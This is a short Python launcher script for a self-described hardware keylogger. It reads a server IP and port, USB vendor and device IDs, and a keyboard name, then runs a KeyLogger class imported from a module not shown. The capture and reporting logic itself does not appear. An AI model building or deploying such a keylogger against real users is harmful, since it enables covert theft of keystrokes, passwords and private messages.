import argparse
from src.Setup import Setup
from src.KeyLogger import KeyLogger


def main(args) -> None:
    setup: Setup = Setup(args)
    keylogger: KeyLogger = setup.get_keylogger()
    keylogger.run(
        id_vendor=(lambda v: v if v else 0x1C4F)(args.vendorId),
        device_id=(lambda d: d if d else 0x008B)(args.deviceId),
    )


if __name__ == "__main__":
    parser: argparse.ArgumentParser = argparse.ArgumentParser(
        description="Python Hardware Keylogger"
    )
    parser.add_argument(
        "-m", "--mode", type=str, help="This Logger level d=debug, p=production"
    )
    parser.add_argument("-i", "--ip", type=str, help="The server IP Addr.")
    parser.add_argument("-p", "--port", type=str, help="The server port")
    parser.add_argument("-d", "--deviceId", type=str, help="The device id")
    parser.add_argument("-v", "--vendorId", type=str, help="The vendor id")
    parser.add_argument(
        "-k",
        "--keyboard",
        type=str,
        help="keyboard_name currently supported: mini_keyboard",
    )
    args = parser.parse_args()
    main(args)
